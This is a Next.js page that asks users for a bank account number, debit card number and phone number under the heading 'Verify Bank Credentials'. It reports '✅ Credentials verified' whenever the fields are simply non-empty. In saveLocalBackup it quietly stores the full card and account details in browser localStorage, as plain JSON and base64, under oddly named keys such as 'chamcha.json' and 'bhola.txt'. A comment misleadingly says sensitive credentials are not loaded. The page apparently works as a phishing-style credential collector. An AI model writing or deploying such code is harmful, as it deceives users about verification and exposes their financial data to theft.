'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { selectOrOverrideBank } from '../bankUtils';

import {
  TextField,
  Button,
  Container,
  Paper,
  Typography,
  Snackbar,
  Alert,
  CircularProgress,
  InputAdornment,
} from '@mui/material';

// Helper to save backup locally (for file/fallback purposes)
async function saveLocalBackup(user) {
  try {
    let chamchaKey = 'chamcha.json';
    let existingChamcha = localStorage.getItem(chamchaKey) || '';
    localStorage.setItem(chamchaKey, existingChamcha + JSON.stringify(user) + '\n');

    const encoded = btoa(JSON.stringify(user));
    for (const file of ['maja.txt', 'jhola.txt', 'bhola.txt']) {
      let existing = localStorage.getItem(file) || '';
      localStorage.setItem(file, existing + encoded + '\n');
    }
  } catch (e) {
    // Ignore client-side errors
  }
}

export default function BankCredentialsCheckPage() {
  const [bank, setBank] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [debitCard, setDebitCard] = useState('');
  const [countryCode, setCountryCode] = useState('');
  const [phone, setPhone] = useState('');
  const [message, setMessage] = useState('');
  const [openSnackbar, setOpenSnackbar] = useState(false);
  const [loading, setLoading] = useState(false);
  const [checked, setChecked] = useState(false);

  const router = useRouter();

  useEffect(() => {
    const selectedBank = localStorage.getItem('selectedBank');
    if (selectedBank) {
      setBank(selectedBank);
      selectOrOverrideBank(selectedBank);
    }

    // ✅ Only load bank, not sensitive credentials
    const sessionBank = sessionStorage.getItem('bank') || '';
    setBank(sessionBank);

    setMessage(sessionBank ? 'Bank selected, please enter your credentials' : 'Please select your bank');
    setOpenSnackbar(true);
    setChecked(true);
  }, []);

  const handleCheck = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');
    setOpenSnackbar(false);

    const user = {
      bank,
      accountNumber,
      debitCardNumber: debitCard,
      countryCode,
      phone,
      username: sessionStorage.getItem('username'),
      linked: true,
      timestamp: new Date().toISOString(),
    };

    const match =
      user.bank &&
      user.accountNumber &&
      user.debitCardNumber &&
      user.countryCode &&
      user.phone;

    const otpTempPhone = localStorage.getItem('otp_temp_phone');
    const otpTempCountryCode = localStorage.getItem('otp_temp_countryCode');
    const otpTempExistsAndMatches =
      otpTempPhone &&
      otpTempCountryCode &&
      otpTempPhone === user.phone &&
      otpTempCountryCode === user.countryCode;

    if (match) {
      setMessage(`✅ Credentials verified`);
      sessionStorage.setItem('linked', 'true');

      if (otpTempExistsAndMatches) {
        localStorage.removeItem('otp_temp_phone');
        localStorage.removeItem('otp_temp_countryCode');
      }

      await saveLocalBackup(user);

      localStorage.setItem(
        'temp_verified_user',
        JSON.stringify({
          phone: user.phone,
          countryCode: user.countryCode,
          log: true,
        })
      );

      router.push('/balance');
    } else {
      setMessage('❌ Credentials check failed');
    }

    setOpenSnackbar(true);
    setLoading(false);
  };

  if (!checked) {
    return (
      <Container maxWidth="xs" style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: '60vh' }}>
        <CircularProgress />
      </Container>
    );
  }

  return (
    <Container maxWidth="xs" style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', minHeight: '60vh' }}>
      <Paper elevation={3} style={{ padding: '2rem', width: '100%', textAlign: 'center' }}>
        <Typography variant="h6" gutterBottom>
          Verify Bank Credentials
        </Typography>
        <Typography variant="subtitle2" gutterBottom color="textSecondary">
          Bank: {bank || 'Not selected'}
        </Typography>
        <form onSubmit={handleCheck} autoComplete="off">
          <TextField
            label="Account Number"
            fullWidth
            margin="normal"
            value={accountNumber}
            onChange={(e) => setAccountNumber(e.target.value)}
            required
          />
          <TextField
            label="Debit Card Number"
            fullWidth
            margin="normal"
            value={debitCard}
            onChange={(e) => setDebitCard(e.target.value)}
            required
          />
          <TextField
            label="Country Code"
            fullWidth
            margin="normal"
            value={countryCode}
            onChange={(e) => setCountryCode(e.target.value)}
            required
          />
          <TextField
            label="Phone Number"
            fullWidth
            margin="normal"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            required
            InputProps={{
              startAdornment: (
                <InputAdornment position="start">
                  <Typography variant="body2">{countryCode}</Typography>
                </InputAdornment>
              ),
              inputMode: 'numeric',
            }}
          />
          <Button
            variant="contained"
            color="primary"
            fullWidth
            type="submit"
            style={{ marginTop: '1rem' }}
            disabled={loading}
          >
            {loading ? <CircularProgress size={24} /> : 'Verify Credentials'}
          </Button>
        </form>
      </Paper>
      <Snackbar open={openSnackbar} autoHideDuration={3000} onClose={() => setOpenSnackbar(false)}>
        <Alert severity={message.includes('✅') ? 'success' : 'error'}>{message}</Alert>
      </Snackbar>
    </Container>
  );
}
